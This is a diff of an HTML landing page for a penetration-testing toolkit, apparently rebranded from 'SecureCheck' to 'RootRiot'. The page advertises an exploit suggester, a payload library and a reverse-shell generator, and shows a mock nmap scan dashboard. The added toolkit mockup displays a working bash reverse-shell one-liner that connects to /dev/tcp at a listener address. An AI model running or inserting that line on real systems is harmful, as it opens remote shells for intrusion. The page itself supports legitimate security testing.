             </div>
         </div>
     </section>
 
-    <section id="features" class="py-16 md:py-20 lg:py-24">
-        <div class="container">
-            <div class="text-center max-w-3xl mx-auto mb-12 md:mb-16 fade-in">
-                <span class="category-badge">Powerful Features</span>
-                <h2 class="text-3xl md:text-4xl font-bold my-4">Everything you need for protocol security testing</h2>
-                <p class="text-gray-300 text-base md:text-lg">SecureCheck provides a comprehensive suite of tools for security professionals to efficiently test and validate network protocols.</p>
+    <!-- Features Section -->
+    <section id="features" class="py-16 lg:py-24 relative bg-black/20">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            
+            <!-- ADDED HEADER FOR FEATURES SECTION -->
+            <div class="text-center mb-16 fade-in-section">
+                <h2 class="text-3xl md:text-4xl font-bold text-white mb-4">Core Capabilities</h2>
+                <p class="text-gray-400 max-w-2xl mx-auto">Comprehensive tools designed to streamline your penetration testing workflow from reconnaissance to exploitation.</p>
             </div>
 
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8 feature-grid">
-                <div class="glass-card feature-card fade-in p-6 lg:p-8">
-                    <div class="feature-icon" style="background-color: rgba(220, 38, 38, 0.1);">
-                        <i class="bx bx-shield-quarter text-3xl text-red-500"></i>
+            <div class="grid md:grid-cols-3 lg:grid-cols-3 gap-6 mb-6">
+                <!-- Card 1 -->
+                <div class="p-6 rounded-xl border border-gray-800 bg-[#0b101b] hover:border-blue-500/30 transition-colors fade-in-section">
+                    <div class="w-10 h-10 rounded-lg bg-blue-900/10 border border-blue-500/20 flex items-center justify-center mb-4">
+                        <i class='bx bx-list-check text-xl text-blue-500'></i>
                     </div>
-                    <h3 class="text-xl font-semibold mb-3">Vulnerability Library</h3>
-                    <p class="text-gray-300 text-sm md:text-base mb-5">Access a comprehensive database of known vulnerabilities for each protocol.</p>
-                    <ul class="features-list mt-auto text-sm md:text-base">
-                        <li><i class="bx bx-check text-lg"></i><span>Categorized by severity and impact</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Regularly updated with new findings</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Includes detailed CVE references</span></li>
-                    </ul>
+                    <h3 class="text-lg font-bold mb-2 text-white">Interactive Checklists</h3>
+                    <p class="text-gray-400 text-xs leading-relaxed">
+                        Track your coverage in real-time. Progress bars auto-update.
+                    </p>
                 </div>
 
-                 <div class="glass-card feature-card fade-in p-6 lg:p-8">
-                    <div class="feature-icon" style="background-color: rgba(245, 158, 11, 0.1);">
-                        <i class="bx bx-test-tube text-3xl text-yellow-500"></i>
+                <!-- Card 2 -->
+                <div class="p-6 rounded-xl border border-gray-800 bg-[#0b101b] hover:border-purple-500/30 transition-colors fade-in-section" style="transition-delay: 0.1s;">
+                    <div class="w-10 h-10 rounded-lg bg-purple-900/10 border border-purple-500/20 flex items-center justify-center mb-4">
+                        <i class='bx bx-terminal text-xl text-purple-500'></i>
                     </div>
-                    <h3 class="text-xl font-semibold mb-3">Testing Checklists</h3>
-                    <p class="text-gray-300 text-sm md:text-base mb-5">Step-by-step testing procedures for thorough protocol examination.</p>
-                    <ul class="features-list mt-auto text-sm md:text-base">
-                        <li><i class="bx bx-check text-lg"></i><span>Interactive checkboxes for tracking</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Detailed testing instructions</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Command-line examples provided</span></li>
-                    </ul>
+                    <h3 class="text-lg font-bold mb-2 text-white">Command Generator</h3>
+                    <p class="text-gray-400 text-xs leading-relaxed">
+                        One-click copy for nmap, hydra, and metasploit commands.
+                    </p>
                 </div>
 
-                 <div class="glass-card feature-card fade-in p-6 lg:p-8">
-                    <div class="feature-icon" style="background-color: rgba(16, 185, 129, 0.1);">
-                        <i class="bx bx-wrench text-3xl text-green-500"></i>
+                <!-- Card 3 -->
+                <div class="p-6 rounded-xl border border-gray-800 bg-[#0b101b] hover:border-green-500/30 transition-colors fade-in-section" style="transition-delay: 0.2s;">
+                    <div class="w-10 h-10 rounded-lg bg-green-900/10 border border-green-500/20 flex items-center justify-center mb-4">
+                        <i class='bx bx-filter-alt text-xl text-green-500'></i>
                     </div>
-                    <h3 class="text-xl font-semibold mb-3">Tool Recommendations</h3>
-                    <p class="text-gray-300 text-sm md:text-base mb-5">Discover and access the right security tools for each protocol.</p>
-                    <ul class="features-list mt-auto text-sm md:text-base">
-                        <li><i class="bx bx-check text-lg"></i><span>Categorized by functionality</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>One-click copy for commands</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Links to tool documentation</span></li>
-                    </ul>
+                    <h3 class="text-lg font-bold mb-2 text-white">Smart Filtering</h3>
+                    <p class="text-gray-400 text-xs leading-relaxed">
+                        Filter by port, protocol, or category instantly.
+                    </p>
+                </div>
+            </div>
+            
+            <div class="grid md:grid-cols-3 gap-6">
+                <!-- NEW Feature Card 4 -->
+                <div class="p-6 rounded-xl border border-gray-800 bg-[#0b101b] hover:border-yellow-500/30 transition-colors fade-in-section" style="transition-delay: 0.3s;">
+                    <div class="w-10 h-10 rounded-lg bg-yellow-900/10 border border-yellow-500/20 flex items-center justify-center mb-4">
+                        <i class='bx bx-file-find text-xl text-yellow-500'></i>
+                    </div>
+                    <h3 class="text-lg font-bold mb-2 text-white">Scan Summaries</h3>
+                    <p class="text-gray-400 text-xs leading-relaxed">
+                        Visualize scan data with detailed breakdowns and command logs.
+                    </p>
                 </div>
 
-                <div class="glass-card feature-card fade-in p-6 lg:p-8">
-                    <div class="feature-icon" style="background-color: rgba(79, 70, 229, 0.1);">
-                        <i class="bx bx-search-alt text-3xl text-indigo-500"></i>
+                <!-- NEW Feature Card 5 -->
+                <div class="p-6 rounded-xl border border-gray-800 bg-[#0b101b] hover:border-red-500/30 transition-colors fade-in-section" style="transition-delay: 0.4s;">
+                    <div class="w-10 h-10 rounded-lg bg-red-900/10 border border-red-500/20 flex items-center justify-center mb-4">
+                        <i class='bx bx-bug text-xl text-red-500'></i>
                     </div>
-                    <h3 class="text-xl font-semibold mb-3">Powerful Search</h3>
-                    <p class="text-gray-300 text-sm md:text-base mb-5">Quickly find protocols by name, port number, or vulnerability keywords.</p>
-                    <ul class="features-list mt-auto text-sm md:text-base">
-                        <li><i class="bx bx-check text-lg"></i><span>Real-time filtering as you type</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Search across protocol properties</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Port range & multi-port search</span></li>
-                    </ul>
+                    <h3 class="text-lg font-bold mb-2 text-white">Exploit Suggester</h3>
+                    <p class="text-gray-400 text-xs leading-relaxed">
+                        Automated vulnerability correlation and exploit recommendations.
+                    </p>
                 </div>
-
-                <div class="glass-card feature-card fade-in p-6 lg:p-8">
-                    <div class="feature-icon" style="background-color: rgba(236, 72, 153, 0.1);">
-                        <i class="bx bx-category-alt text-3xl text-pink-500"></i>
+                
+                <!-- NEW Feature Card 6: Toolkit -->
+                <div class="p-6 rounded-xl border border-gray-800 bg-[#0b101b] hover:border-blue-500/30 transition-colors fade-in-section" style="transition-delay: 0.5s;">
+                    <div class="w-10 h-10 rounded-lg bg-blue-900/10 border border-blue-500/20 flex items-center justify-center mb-4">
+                        <i class='bx bx-wrench text-xl text-blue-500'></i>
                     </div>
-                    <h3 class="text-xl font-semibold mb-3">Category Filtering</h3>
-                    <p class="text-gray-300 text-sm md:text-base mb-5">Organize protocols by categories for efficient testing workflows.</p>
-                    <ul class="features-list mt-auto text-sm md:text-base">
-                        <li><i class="bx bx-check text-lg"></i><span>Color-coded visual organization</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Filter by multiple categories</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Customizable category system</span></li>
-                    </ul>
-                </div>
-
-                <div class="glass-card feature-card fade-in p-6 lg:p-8">
-                    <div class="feature-icon" style="background-color: rgba(37, 99, 235, 0.1);">
-                        <i class="bx bx-chart text-3xl text-blue-600"></i>
-                    </div>
-                    <h3 class="text-xl font-semibold mb-3">Progress Tracking</h3>
-                    <p class="text-gray-300 text-sm md:text-base mb-5">Monitor your testing progress with visual indicators and statistics.</p>
-                    <ul class="features-list mt-auto text-sm md:text-base">
-                        <li><i class="bx bx-check text-lg"></i><span>Percentage-based completion</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Animated progress bars</span></li>
-                        <li><i class="bx bx-check text-lg"></i><span>Testing history & audit logs</span></li>
-                    </ul>
+                    <h3 class="text-lg font-bold mb-2 text-white">Cyber Utilities</h3>
+                    <p class="text-gray-400 text-xs leading-relaxed">
+                        Encoders, hashers, IP calculators, and reverse shell generators.
+                    </p>
                 </div>
             </div>
         </div>
     </section>
 
-    <section id="demo" class="py-16 md:py-20 lg:py-24 bg-gray-900 bg-opacity-30">
-        <div class="container">
-            <div class="max-w-3xl mx-auto text-center mb-12 md:mb-16 fade-in">
-                <span class="category-badge">See It In Action</span>
-                <h2 class="text-3xl md:text-4xl font-bold my-4">How SecureCheck Works</h2>
-                <p class="text-gray-300 text-base md:text-lg">Our streamlined interface makes protocol security testing more efficient and thorough than ever before.</p>
-            </div>
-
-            <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 md:gap-16 items-center">
-                <div class="lg:col-span-5 fade-in space-y-8 md:space-y-10">
-                    <div>
-                        <div class="flex items-center mb-4">
-                            <div class="w-10 h-10 md:w-12 md:h-12 rounded-full bg-primary flex-shrink-0 flex items-center justify-center text-white font-bold text-lg md:text-xl mr-4">1</div>
-                            <h3 class="text-xl md:text-2xl font-semibold">Select a Protocol</h3>
+    <!-- NEW SECTION: Toolkit Showcase -->
+    <section id="toolkit" class="py-20 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <div class="grid md:grid-cols-2 gap-16 items-center">
+                <div class="fade-in-section">
+                    <h2 class="text-3xl md:text-4xl font-bold text-white mb-4">Cyber Swiss Army Knife</h2>
+                    <p class="text-gray-400 mb-8 leading-relaxed">
+                        Stop switching contexts. Our integrated toolkit allows you to generate payloads, hash strings, calculate subnets, and stabilize shells without leaving your workflow.
+                    </p>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-y-4 gap-x-2 mb-8">
+                        <div class="flex items-start gap-3">
+                            <i class='bx bx-check-circle text-blue-500 text-xl mt-1'></i>
+                            <div>
+                                <h4 class="text-white font-bold text-sm">RevShell Generator</h4>
+                                <p class="text-gray-500 text-xs">One-liners for Bash, Python, etc.</p>
+                            </div>
                         </div>
-                        <p class="text-gray-300 ml-14 md:ml-16 text-sm md:text-base">
-                            Browse or search our comprehensive database, organized by category and port number.
-                        </p>
-                    </div>
-
-                     <div>
-                        <div class="flex items-center mb-4">
-                            <div class="w-10 h-10 md:w-12 md:h-12 rounded-full bg-primary flex-shrink-0 flex items-center justify-center text-white font-bold text-lg md:text-xl mr-4">2</div>
-                            <h3 class="text-xl md:text-2xl font-semibold">Review Vulnerabilities</h3>
+                        <div class="flex items-start gap-3">
+                            <i class='bx bx-check-circle text-blue-500 text-xl mt-1'></i>
+                            <div>
+                                <h4 class="text-white font-bold text-sm">Crypto Suite</h4>
+                                <p class="text-gray-500 text-xs">MD5, SHA, Base64, Hex encoders.</p>
+                            </div>
                         </div>
-                        <p class="text-gray-300 ml-14 md:ml-16 text-sm md:text-base">
-                            Examine common vulnerabilities specific to the protocol, with detailed explanations.
-                        </p>
-                    </div>
-
-                     <div>
-                        <div class="flex items-center mb-4">
-                             <div class="w-10 h-10 md:w-12 md:h-12 rounded-full bg-primary flex-shrink-0 flex items-center justify-center text-white font-bold text-lg md:text-xl mr-4">3</div>
-                            <h3 class="text-xl md:text-2xl font-semibold">Follow Test Procedures</h3>
+                        <div class="flex items-start gap-3">
+                            <i class='bx bx-check-circle text-blue-500 text-xl mt-1'></i>
+                            <div>
+                                <h4 class="text-white font-bold text-sm">Network Ops</h4>
+                                <p class="text-gray-500 text-xs">Subnet, CIDR & Port tools.</p>
+                            </div>
                         </div>
-                        <p class="text-gray-300 ml-14 md:ml-16 text-sm md:text-base">
-                            Execute step-by-step tests with interactive checklists for comprehensive coverage.
-                        </p>
-                    </div>
-
-                    <div>
-                        <div class="flex items-center mb-4">
-                             <div class="w-10 h-10 md:w-12 md:h-12 rounded-full bg-primary flex-shrink-0 flex items-center justify-center text-white font-bold text-lg md:text-xl mr-4">4</div>
-                            <h3 class="text-xl md:text-2xl font-semibold">Track Progress</h3>
+                        <div class="flex items-start gap-3">
+                            <i class='bx bx-check-circle text-blue-500 text-xl mt-1'></i>
+                            <div>
+                                <h4 class="text-white font-bold text-sm">System Tools</h4>
+                                <p class="text-gray-500 text-xs">Chmod, Timestamp, TTY.</p>
+                            </div>
                         </div>
-                        <p class="text-gray-300 ml-14 md:ml-16 text-sm md:text-base">
-                            Monitor progress with visual indicators and save results for reporting.
-                        </p>
+                        <div class="flex items-start gap-3">
+                            <i class='bx bx-check-circle text-blue-500 text-xl mt-1'></i>
+                            <div>
+                                <h4 class="text-white font-bold text-sm">Payload Library</h4>
+                                <p class="text-gray-500 text-xs">Ready-to-use XSS, SQLi, & RCE.</p>
+                            </div>
+                        </div>
+                        <div class="flex items-start gap-3">
+                            <i class='bx bx-check-circle text-blue-500 text-xl mt-1'></i>
+                            <div>
+                                <h4 class="text-white font-bold text-sm">Reconnaissance</h4>
+                                <p class="text-gray-500 text-xs">Google Dorks & Port DB.</p>
+                            </div>
+                        </div>
                     </div>
+                    <a href="toolkit" class="btn-primary text-white px-8 py-3 rounded-lg font-bold text-lg inline-flex items-center gap-2 hover:scale-105 transition-transform">
+                        <i class='bx bx-wrench'></i> Launch Toolkit
+                    </a>
                 </div>
-
-                <div class="lg:col-span-7 fade-in">
-                    <div class="relative rounded-xl overflow-hidden shadow-2xl border border-gray-700">
-                        <video controls playsinline webkit-playsinline muted class="w-full rounded-xl block aspect-video">
-                            <source src="https://cdn.jsdelivr.net/gh/adityasingh1996/SecureCheck@main/video/securecheck-demo.mp4" type="video/mp4">
-                            Your browser does not support the video tag.
-                        </video>
+                
+                <!-- Visual Representation of Toolkit -->
+                <div class="relative fade-in-section mt-10 md:mt-0">
+                    <div class="absolute -inset-4 bg-blue-600/20 blur-[60px] rounded-full z-0"></div>
+                    <div class="relative z-10 bg-[#0b101b] border border-gray-700 rounded-xl p-6 shadow-2xl">
+                        <div class="flex items-center justify-between border-b border-gray-800 pb-4 mb-4">
+                            <div class="flex items-center gap-2">
+                                <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                                <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                                <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                            </div>
+                            <span class="text-xs text-gray-500 font-mono">revshell_gen.exe</span>
+                        </div>
+                        <div class="space-y-3">
+                            <div>
+                                <label class="text-[10px] font-bold text-gray-500 uppercase block mb-1">LHOST</label>
+                                <div class="bg-black/30 border border-gray-700 rounded px-3 py-2 text-sm text-white font-mono">10.10.14.15</div>
+                            </div>
+                            <div>
+                                <label class="text-[10px] font-bold text-gray-500 uppercase block mb-1">LPORT</label>
+                                <div class="bg-black/30 border border-gray-700 rounded px-3 py-2 text-sm text-white font-mono">9001</div>
+                            </div>
+                            <div>
+                                <label class="text-[10px] font-bold text-gray-500 uppercase block mb-1">Payload</label>
+                                <div class="bg-black/30 border border-blue-500/30 rounded px-3 py-3 text-xs text-blue-400 font-mono">bash -i >& /dev/tcp/10.10.14.15/9001 0>&1</div>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <section class="py-16 md:py-20 lg:py-24">
-        <div class="container">
-            <div class="glass-card p-8 md:p-12 relative overflow-hidden fade-in">
-                <div class="absolute inset-0 pointer-events-none" aria-hidden="true">
-                    <div class="absolute top-0 -right-10 w-40 h-40 md:w-60 md:h-60 bg-primary opacity-15 rounded-full filter blur-3xl"></div>
-                    <div class="absolute bottom-0 -left-10 w-40 h-40 md:w-60 md:h-60 bg-secondary opacity-15 rounded-full filter blur-3xl"></div>
+    <!-- Scan Intelligence Dashboard -->
+    <section id="scan-intelligence" class="py-24 relative overflow-hidden">
+        <!-- Background Decoration -->
+        <div class="absolute top-0 right-0 w-1/2 h-full bg-gradient-to-l from-blue-900/10 to-transparent pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <div class="mb-12 text-center fade-in-section">
+                <h2 class="text-3xl md:text-4xl font-bold text-white mb-4">Scan Intelligence & Exploitation</h2>
+                <p class="text-gray-400 max-w-2xl mx-auto mb-8">Analyze scan results and discover potential exploit paths in a unified interface.</p>
+                
+                <!-- NEW CTA BUTTON for Exploit Suggester -->
+                <a href="exploitSuggester" class="btn-primary text-white px-8 py-3 rounded-lg font-bold text-lg inline-flex items-center gap-2 hover:scale-105 transition-transform">
+                    <i class='bx bx-radar'></i> Launch Exploit Suggester
+                </a>
+            </div>
+
+            <!-- The Dashboard Interface -->
+            <div class="bg-[#0b101b] border border-gray-800 rounded-xl overflow-hidden shadow-2xl fade-in-section" style="box-shadow: 0 0 50px rgba(0,0,0,0.5);">
+                <!-- Dashboard Header/Tabs -->
+                <div class="border-b border-gray-800 bg-[#02040a]/50 p-4 flex gap-4 overflow-x-auto">
+                    <button class="flex items-center gap-2 px-4 py-2 bg-[#111625] text-green-400 border border-green-500/30 rounded-lg text-sm font-medium whitespace-nowrap">
+                        <i class='bx bx-file-blank'></i> Scan Summary & Details
+                    </button>
+                    <button class="flex items-center gap-2 px-4 py-2 text-gray-500 hover:text-gray-300 rounded-lg text-sm font-medium transition-colors whitespace-nowrap">
+                        <i class='bx bx-bug'></i> Exploit Suggester
+                    </button>
                 </div>
 
-                <div class="relative z-10 max-w-3xl mx-auto text-center">
-                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-bold mb-5">Ready to secure your protocols?</h2>
-                    <p class="text-lg sm:text-xl text-gray-300 mb-8">Join thousands of security professionals who trust SecureCheck for comprehensive protocol testing.</p>
-
-                    <div class="flex flex-col sm:flex-row justify-center items-center space-y-4 sm:space-y-0 sm:space-x-6">
-                         <a href="https://adityasingh1996.github.io/SecureCheck/SecureCheck" class="btn btn-primary glow-btn py-3 px-6 md:py-4 md:px-8 text-base md:text-lg w-full sm:w-auto">
-                            <i class="bx bx-rocket mr-2"></i> Get Started
-                        </a>
+                <!-- Dashboard Content -->
+                <div class="p-6 md:p-8">
+                    
+                    <div class="flex justify-between items-end mb-6">
+                        <h3 class="text-2xl font-bold text-white">Overall Scan Summary</h3>
+                        <span class="text-gray-500 text-sm">2 host(s) scanned</span>
                     </div>
 
-                    <p class="mt-6 text-sm text-gray-400">No credit card required. It's Free!</p>
+                    <!-- Stats Grid -->
+                    <div class="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
+                        <div class="dash-stat-box">
+                            <div class="dash-label">Scanner</div>
+                            <div class="dash-value">nmap 7.80</div>
+                        </div>
+                        <div class="dash-stat-box">
+                            <div class="dash-label">Scan Type</div>
+                            <div class="dash-value">Aggressive (-A)</div>
+                        </div>
+                        <div class="dash-stat-box">
+                            <div class="dash-label">Start Time</div>
+                            <div class="dash-value text-xs">9/13/2020, 5:56 PM</div>
+                        </div>
+                        <div class="dash-stat-box">
+                            <div class="dash-label">End Time</div>
+                            <div class="dash-value text-xs">9/13/2020, 5:58 PM</div>
+                        </div>
+                        <div class="dash-stat-box">
+                            <div class="dash-label">Duration</div>
+                            <div class="dash-value">1m 45s</div>
+                        </div>
+                    </div>
+
+                    <!-- Command Block -->
+                    <div class="mb-8">
+                        <div class="dash-label mb-2">Command Executed</div>
+                        <div class="dash-code">
+                            nmap -A -T4 -oX sample_output.xml scanme.nmap.org 192.168.1.1
+                        </div>
+                    </div>
+
+                    <!-- View Toggles -->
+                    <div class="flex gap-2 mb-4">
+                        <button class="px-3 py-1.5 bg-[#1f2937] text-white text-xs rounded border border-gray-700 flex items-center gap-1">
+                            <i class='bx bxs-grid-alt'></i> Card View
+                        </button>
+                        <button class="px-3 py-1.5 text-gray-500 text-xs rounded border border-transparent hover:bg-gray-900 flex items-center gap-1">
+                            <i class='bx bx-table'></i> Table View
+                        </button>
+                    </div>
+
+                    <!-- Host Card -->
+                    <div class="bg-[#111625] border border-gray-800 rounded-lg p-6 flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-12 h-12 rounded bg-blue-900/20 border border-blue-500/20 flex items-center justify-center text-blue-400">
+                                <i class='bx bx-server text-2xl'></i>
+                            </div>
+                            <div>
+                                <div class="text-xl font-bold text-white">45.33.32.156</div>
+                                <div class="text-gray-500 text-sm">scanme.nmap.org</div>
+                            </div>
+                        </div>
+                        <div class="px-3 py-1 bg-green-900/20 text-green-500 border border-green-500/20 rounded text-xs font-bold">
+                            UP
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-8 mt-4 px-2">
+                        <div>
+                            <div class="text-gray-500 text-xs uppercase mb-1">IPs</div>
+                            <div class="text-gray-300 text-sm">45.33.32.156</div>
+                        </div>
+                        <div>
+                            <div class="text-gray-500 text-xs uppercase mb-1">MAC</div>
+                            <div class="text-gray-300 text-sm">00:11:22:33:44:55 (Fake MAC Vendor)</div>
+                        </div>
+                    </div>
+
                 </div>
             </div>
         </div>
     </section>
 
-    <footer>
-        <div class="container">
-            <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-12 gap-8 mb-10 md:mb-12">
-                <div class="sm:col-span-2 md:col-span-4">
-                    <h2 class="text-2xl font-bold mb-4"><span class="text-primary-light">Secure</span>Check</h2>
-                    <p class="text-gray-400 text-sm mb-6">A comprehensive protocol security testing application for cybersecurity professionals.</p>
-                    <div class="flex space-x-4">
-                        <a href="#" aria-label="Twitter" class="w-9 h-9 rounded-full bg-gray-800 flex items-center justify-center text-gray-300 hover:bg-primary hover:text-white transition-all">
-                            <i class="bx bxl-twitter text-lg"></i>
-                        </a>
-                        <a href="#" aria-label="LinkedIn" class="w-9 h-9 rounded-full bg-gray-800 flex items-center justify-center text-gray-300 hover:bg-primary hover:text-white transition-all">
-                            <i class="bx bxl-linkedin text-lg"></i>
-                        </a>
-                        <a href="#" aria-label="GitHub" class="w-9 h-9 rounded-full bg-gray-800 flex items-center justify-center text-gray-300 hover:bg-primary hover:text-white transition-all">
-                            <i class="bx bxl-github text-lg"></i>
-                        </a>
-                    </div>
-                </div>
-
-                <div class="md:col-span-2">
-                    <h3 class="text-base font-semibold mb-4 text-gray-200">Product</h3>
-                    <ul class="space-y-2 text-sm">
-                        <li><a href="#features" class="text-gray-400 hover:text-white transition-colors">Features</a></li>
-                        <li><a href="#pricing" class="text-gray-400 hover:text-white transition-colors">Pricing</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Integrations</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Changelog</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Roadmap</a></li>
-                    </ul>
-                </div>
-
-                <div class="md:col-span-2">
-                     <h3 class="text-base font-semibold mb-4 text-gray-200">Resources</h3>
-                    <ul class="space-y-2 text-sm">
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Documentation</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Blog</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Guides</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">API Reference</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Community</a></li>
-                    </ul>
-                </div>
-
-                <div class="md:col-span-2">
-                    <h3 class="text-base font-semibold mb-4 text-gray-200">Company</h3>
-                    <ul class="space-y-2 text-sm">
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">About</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Careers</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Contact</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Partners</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Legal</a></li>
-                    </ul>
-                </div>
-
-                <div class="md:col-span-2">
-                    <h3 class="text-base font-semibold mb-4 text-gray-200">Support</h3>
-                     <ul class="space-y-2 text-sm">
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Help Center</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Status</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Report a Bug</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Feature Request</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors">Contact Support</a></li>
-                    </ul>
-                </div>
+    <!-- Footer -->
+    <footer class="py-12 border-t border-gray-800 bg-[#02040a]">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row justify-between items-center gap-6">
+            <div class="flex items-center gap-2">
+                <span class="font-bold text-lg tracking-tight text-white">Root<span class="text-blue-500">Riot</span></span>
+                <span class="text-gray-600 text-sm">&copy; 2024</span>
             </div>
-
-            <div class="pt-6 md:pt-8 border-t border-gray-800">
-                <div class="flex flex-col md:flex-row justify-between items-center">
-                    <p class="text-gray-500 text-xs sm:text-sm order-2 md:order-1 mt-4 md:mt-0">&copy; 2025 SecureCheck. All rights reserved.</p>
-                    <div class="flex space-x-4 sm:space-x-6 order-1 md:order-2 text-xs sm:text-sm">
-                        <a href="#" class="text-gray-500 hover:text-gray-300 transition-colors">Privacy Policy</a>
-                        <a href="#" class="text-gray-500 hover:text-gray-300 transition-colors">Terms of Service</a>
-                        <a href="#" class="text-gray-500 hover:text-gray-300 transition-colors">Cookie Policy</a>
-                    </div>
-                </div>
-
-                <p class="text-center text-gray-500 text-xs sm:text-sm mt-4">
-                    Made with ❤️ by Aditya Singh
-                </p>
-                 </div>
+            <div class="mt-4 md:mt-0 text-gray-500 text-sm">Made with <span class="text-red-500 animate-pulse">?</span> by Aditya Singh</div>
+            
+            <div class="flex gap-6 text-sm text-gray-500">
+                <a href="#" class="hover:text-white transition-colors">Privacy</a>
+                <a href="#" class="hover:text-white transition-colors">Terms</a>
+            </div>
         </div>
     </footer>
 
+    <!-- Intersection Observer for Fade In on Scroll -->
     <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('is-visible');
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, { threshold: 0.1 });
 
-        const navbar = document.getElementById('navbar');
-        let lastScrollY = window.scrollY;
-        window.addEventListener('scroll', () => {
-            if (window.scrollY > 50) {
-                navbar.classList.add('scrolled');
-            } else {
-                navbar.classList.remove('scrolled');
-            }
-            lastScrollY = window.scrollY;
-        });
-
-        const menuToggle = document.getElementById('menuToggle');
-        const menuClose = document.getElementById('menuClose');
-        const mobileMenu = document.getElementById('mobileMenu');
-        const menuOverlay = document.getElementById('menuOverlay');
-        const body = document.body;
-
-        const openMenu = () => {
-            mobileMenu.classList.add('open');
-            menuOverlay.classList.add('open');
-            body.style.overflow = 'hidden'; 
-        };
-
-        const closeMenu = () => {
-            mobileMenu.classList.remove('open');
-            menuOverlay.classList.remove('open');
-             body.style.overflow = ''; 
-        };
-
-        menuToggle.addEventListener('click', openMenu);
-        menuClose.addEventListener('click', closeMenu);
-        menuOverlay.addEventListener('click', closeMenu);
-
-        const mobileNavLinks = mobileMenu.querySelectorAll('a');
-        mobileNavLinks.forEach(link => {
-            link.addEventListener('click', (e) => {
-
-                if (link.getAttribute('href')?.startsWith('#')) {
-                     closeMenu();
-                }
-
+            document.querySelectorAll('.fade-in-section').forEach(section => {
+                observer.observe(section);
             });
         });
-
-        const observeElements = document.querySelectorAll('.fade-in');
-
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('visible');
-                    observer.unobserve(entry.target); 
-                }
-            });
-        }, {
-            threshold: 0.1 
-        });
-
-        observeElements.forEach(element => {
-            observer.observe(element);
-        });
-
-        requestAnimationFrame(() => {
-             const heroContent = document.getElementById('heroContent');
-             const heroImage = document.getElementById('heroImage');
-             if (heroContent) heroContent.classList.add('visible');
-             if (heroImage) heroImage.classList.add('visible');
-        });
-
     </script>
 </body>
 </html>
-
